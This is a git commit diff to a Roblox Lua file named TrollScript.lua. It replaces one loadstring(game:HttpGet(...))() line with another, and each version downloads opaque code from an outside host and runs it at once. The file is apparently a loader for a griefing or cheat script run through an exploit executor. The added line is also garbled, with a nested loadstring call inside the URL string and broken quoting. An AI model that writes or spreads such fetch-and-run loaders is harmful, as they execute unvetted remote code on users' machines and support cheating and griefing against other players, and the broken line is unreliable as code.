b789e78ad27f7f0389abc0eb992dfc8191c4facd
SibahAnakBaik <workfire961@gmail.com>
2025-12-19 16:33:15 +0700

    Update TrollScript.lua

--- TrollScript.lua
+++ TrollScript.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/2db7aaf2ee1160eea375bf7424f27413"))()
+loadstring(game:HttpGet("loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/02c3bd7981d5a8ff04f7aed11bf9e2e098a74c12b66f629440d600874b4ac3c7/download"))()"))()
